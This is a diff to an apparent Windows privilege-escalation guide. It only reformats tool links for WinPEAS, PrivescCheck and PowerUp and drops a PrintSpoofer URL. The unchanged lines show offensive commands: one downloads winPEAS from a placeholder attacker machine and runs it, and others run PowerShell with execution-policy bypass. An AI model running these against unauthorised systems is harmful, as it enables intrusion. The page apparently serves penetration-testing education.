@@ -14,7 +14,7 @@ description: "Learn about various techniques and methods for privilege escalatio
 
 ## Automation script
 
-**WinPEAS** \[[🔗](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS)]
+**[WinPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS)**
 ```powershell
 powershell
 
@@ -24,12 +24,12 @@ iwr -uri http://<ATTACKER_MACHINE>/winPEASx64.exe -Outfile winPEAS.exe
 .\winPEAS.exe
 ```
 
-**PrivescCheck** \[[🔗](https://github.com/itm4n/PrivescCheck)]
+**[PrivescCheck](https://github.com/itm4n/PrivescCheck)**
 ```dos
 powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"
 ```
 
-**PowerUp.ps1** \[[🔗](https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc)] [Docs](https://powersploit.readthedocs.io/en/latest/Privesc/)
+**[PowerUp.ps1](https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc)** - [Docs](https://powersploit.readthedocs.io/en/latest/Privesc/)
 ```powershell
 powershell -ep bypass
 . .\PowerUp.ps1
@@ -406,7 +406,7 @@ By default, Local System, Network Service, Local Service, and some authenticated
 
 {{< details summary="PrintSpoofer.exe" >}}
 
-This works on **Windows 10** and **Server 2016/2019** https://github.com/itm4n/PrintSpoofer
+This works on **Windows 10** and **Server 2016/2019**
 
 1. Verify privileges:
 
